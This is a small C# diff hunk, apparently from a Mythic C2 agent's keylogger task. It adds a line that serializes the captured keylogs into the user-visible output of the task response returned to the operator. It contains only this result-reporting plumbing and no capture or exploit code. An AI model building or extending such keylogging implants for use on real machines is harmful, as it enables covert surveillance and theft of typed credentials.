@@ -102,7 +102,8 @@ namespace Tasks
                         _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse
                         {
                             TaskID = _data.ID,
-                            Keylogs = aggregated.ToArray()
+                            Keylogs = aggregated.ToArray(),
+                            UserOutput = _jsonSerializer.Serialize(aggregated.ToArray())
                         });
                     }
                 }
